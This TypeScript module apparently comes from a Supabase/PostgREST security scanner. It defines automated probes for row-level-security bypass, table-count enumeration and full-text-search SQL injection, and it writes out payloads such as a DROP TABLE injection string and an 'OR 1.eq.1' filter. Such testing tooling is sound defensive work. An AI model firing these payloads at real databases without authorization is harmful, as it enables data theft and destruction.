/**
 * PostgREST Edge attacks
 * Tests for PostgREST edge case vulnerabilities
 */

import type { AttackVector } from '$lib/types/attacks';

export const postgrestEdgeAttacks: AttackVector[] = [
	{
		id: 'postgrest-jsonb-operator-abuse',
		name: 'JSONB Operator Injection',
		description: 'Test for JSONB operator injection vulnerabilities',
		category: 'rls',
		severity: 'high',
		async execute(context) {
			try {
				// Try various JSONB operators
				const jsonbQueries = [
					'users?metadata->admin=eq.true',
					'users?data->>role=eq.superuser',
					'users?config@>{"admin":true}',
					'users?settings?admin',
					'users?profile#>>{0,admin}=eq.true'
				];

				const accessible: string[] = [];

				for (const query of jsonbQueries) {
					const res = await fetch(
						`${context.supabaseUrl}/rest/v1/${query}`,
						{
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`
							},
							signal: context.signal
						}
					);

					const data = await res.json();
					if (Array.isArray(data) && data.length > 0) {
						accessible.push(query);
					}
				}

				return {
					breached: accessible.length > 0,
					status: accessible.length > 0 ? 'breached' : 'secure',
					summary: accessible.length > 0
						? `JSONB queries expose data: ${accessible.length} queries worked`
						: 'JSONB operators properly filtered',
					evidence: accessible.length > 0 ? { queries: accessible } : undefined
				};
			} catch {
				return { breached: false, status: 'secure', summary: 'JSONB operators protected' };
			}
		}
	},
	{
		id: 'postgrest-array-abuse',
		name: 'Array Operator Abuse',
		description: 'Test for PostgreSQL array operator vulnerabilities',
		category: 'rls',
		severity: 'medium',
		async execute(context) {
			try {
				// Array operator tests
				const arrayQueries = [
					'users?roles=cs.{admin}',
					'users?permissions=ov.{superuser,admin}',
					'users?tags=cd.{all}',
					'users?select=*,array_agg(role)',
					'users?select=unnest(roles)'
				];

				const results: Array<{ query: string; status: number }> = [];

				for (const query of arrayQueries) {
					const res = await fetch(
						`${context.supabaseUrl}/rest/v1/${query}`,
						{
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`
							},
							signal: context.signal
						}
					);

					results.push({ query, status: res.status });
				}

				const successfulQueries = results.filter(r => r.status === 200);

				return {
					breached: successfulQueries.length > 0,
					status: successfulQueries.length > 0 ? 'breached' : 'secure',
					summary: successfulQueries.length > 0
						? `Array operators accessible: ${successfulQueries.length}/${arrayQueries.length}`
						: 'Array operators properly restricted',
					evidence: { results }
				};
			} catch {
				return { breached: false, status: 'secure', summary: 'Array operators protected' };
			}
		}
	},
	{
		id: 'postgrest-fts-injection',
		name: 'Full-Text Search Injection',
		description: 'Test for SQL injection via full-text search',
		category: 'rls',
		severity: 'high',
		async execute(context) {
			try {
				// Full-text search injection attempts
				const ftsQueries = [
					"documents?content=fts.admin'--",
					"documents?body=plfts.attack|admin",
					"posts?title=phfts(english).'; DROP TABLE posts;--",
					"articles?text=wfts.secret&admin",
					"search?query=fts.* | SELECT * FROM users"
				];

				for (const query of ftsQueries) {
					const res = await fetch(
						`${context.supabaseUrl}/rest/v1/${query}`,
						{
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`
							},
							signal: context.signal
						}
					);

					const data = await res.json();
					// Check if injection succeeded (got data instead of error)
					if (Array.isArray(data) && data.length > 0 && !data[0]?.code) {
						return {
							breached: true,
							status: 'breached',
							summary: 'FTS injection may be possible',
							evidence: { query, resultCount: data.length }
						};
					}
				}

				return {
					breached: false,
					status: 'secure',
					summary: 'Full-text search properly sanitized'
				};
			} catch {
				return { breached: false, status: 'secure', summary: 'FTS protected' };
			}
		}
	},
	{
		id: 'postgrest-range-type-abuse',
		name: 'Range Type Operator Abuse',
		description: 'Test for range type operator vulnerabilities',
		category: 'rls',
		severity: 'medium',
		async execute(context) {
			try {
				// Range type queries
				const rangeQueries = [
					'events?time_range=sr.[2020-01-01,2030-01-01]',
					'bookings?date_range=nxr.[,]',
					'prices?value_range=adj.[0,999999999]',
					'slots?availability=ov.(,)'
				];

				const results: string[] = [];

				for (const query of rangeQueries) {
					const res = await fetch(
						`${context.supabaseUrl}/rest/v1/${query}`,
						{
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`
							},
							signal: context.signal
						}
					);

					if (res.ok) {
						const data = await res.json();
						if (Array.isArray(data) && data.length > 0) {
							results.push(query);
						}
					}
				}

				return {
					breached: results.length > 0,
					status: results.length > 0 ? 'breached' : 'secure',
					summary: results.length > 0
						? `Range queries expose data: ${results.length} queries`
						: 'Range operators properly restricted',
					evidence: results.length > 0 ? { queries: results } : undefined
				};
			} catch {
				return { breached: false, status: 'secure', summary: 'Range types protected' };
			}
		}
	},
	{
		id: 'postgrest-count-exact-abuse',
		name: 'Exact Count Enumeration',
		description: 'Test for data enumeration via exact count',
		category: 'rls',
		severity: 'low',
		async execute(context) {
			try {
				// Try to get exact counts which can leak data size
				const countTables = ['users', 'accounts', 'orders', 'transactions', 'messages'];

				const counts: Array<{ table: string; count: string | null }> = [];

				for (const table of countTables) {
					const res = await fetch(
						`${context.supabaseUrl}/rest/v1/${table}?select=count`,
						{
							method: 'HEAD',
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`,
								'Prefer': 'count=exact'
							},
							signal: context.signal
						}
					);

					const contentRange = res.headers.get('content-range');
					if (contentRange) {
						counts.push({ table, count: contentRange });
					}
				}

				return {
					breached: counts.length > 0,
					status: counts.length > 0 ? 'breached' : 'secure',
					summary: counts.length > 0
						? `Exact counts exposed for ${counts.length} tables`
						: 'Count enumeration not possible',
					evidence: counts.length > 0 ? { counts } : undefined
				};
			} catch {
				return { breached: false, status: 'secure', summary: 'Counts protected' };
			}
		}
	},
	{
		id: 'postgrest-negation-filter-bypass',
		name: 'Negation Filter Bypass',
		description: 'Test for RLS bypass via negation operators',
		category: 'rls',
		severity: 'high',
		async execute(context) {
			try {
				// Try negation operators to bypass filters
				const negationQueries = [
					'users?id=not.is.null',
					'users?role=not.eq.deleted',
					'profiles?status=not.in.(deleted,banned)',
					'accounts?type=neq.system',
					'posts?visibility=not.eq.private'
				];

				for (const query of negationQueries) {
					const res = await fetch(
						`${context.supabaseUrl}/rest/v1/${query}`,
						{
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`
							},
							signal: context.signal
						}
					);

					const data = await res.json();
					if (Array.isArray(data) && data.length > 5) {
						return {
							breached: true,
							status: 'breached',
							summary: `Negation filter exposes ${data.length} records`,
							evidence: { query, count: data.length }
						};
					}
				}

				return {
					breached: false,
					status: 'secure',
					summary: 'Negation operators properly restricted'
				};
			} catch {
				return { breached: false, status: 'secure', summary: 'Negation filters secure' };
			}
		}
	},
	{
		id: 'postgrest-or-filter-bypass',
		name: 'OR Filter RLS Bypass',
		description: 'Test for RLS bypass using OR conditions',
		category: 'rls',
		severity: 'critical',
		async execute(context) {
			try {
				// Try OR conditions to bypass RLS
				const orQueries = [
					'users?or=(role.eq.admin,id.not.is.null)',
					'profiles?or=(user_id.eq.1,status.eq.active)',
					'orders?or=(amount.gt.0,user_id.is.null)',
					'posts?or=(visibility.eq.public,1.eq.1)'
				];

				for (const query of orQueries) {
					const res = await fetch(
						`${context.supabaseUrl}/rest/v1/${query}`,
						{
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`
							},
							signal: context.signal
						}
					);

					const data = await res.json();
					if (Array.isArray(data) && data.length > 10) {
						return {
							breached: true,
							status: 'breached',
							summary: `OR condition bypasses RLS: ${data.length} records exposed`,
							evidence: { query, count: data.length }
						};
					}
				}

				return {
					breached: false,
					status: 'secure',
					summary: 'OR filters properly restricted by RLS'
				};
			} catch {
				return { breached: false, status: 'secure', summary: 'OR filters secure' };
			}
		}
	},
	{
		id: 'postgrest-resource-embedding-deep',
		name: 'Deep Resource Embedding',
		description: 'Test for deep resource embedding data leaks',
		category: 'rls',
		severity: 'high',
		async execute(context) {
			try {
				// Try deep embedding queries
				const deepEmbeddings = [
					'users?select=*,profiles(*,settings(*,audit_log(*)))',
					'organizations?select=*,members(*,user(*,roles(*)))',
					'orders?select=*,customer(*,addresses(*),payment_methods(*))',
					'projects?select=*,owner(*),members(*,permissions(*))'
				];

				for (const query of deepEmbeddings) {
					const res = await fetch(
						`${context.supabaseUrl}/rest/v1/${query}`,
						{
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`
							},
							signal: context.signal
						}
					);

					const data = await res.json();
					if (Array.isArray(data) && data.length > 0) {
						// Check depth of data returned
						const hasDeepData = data.some(row => {
							const json = JSON.stringify(row);
							return json.split('{').length > 5; // Multiple nested objects
						});

						if (hasDeepData) {
							return {
								breached: true,
								status: 'breached',
								summary: 'Deep embedding exposes nested data',
								evidence: { query: query.split('?')[0], depth: 'multiple levels' }
							};
						}
					}
				}

				return {
					breached: false,
					status: 'secure',
					summary: 'Deep embedding properly restricted'
				};
			} catch {
				return { breached: false, status: 'secure', summary: 'Embedding protected' };
			}
		}
	}
];
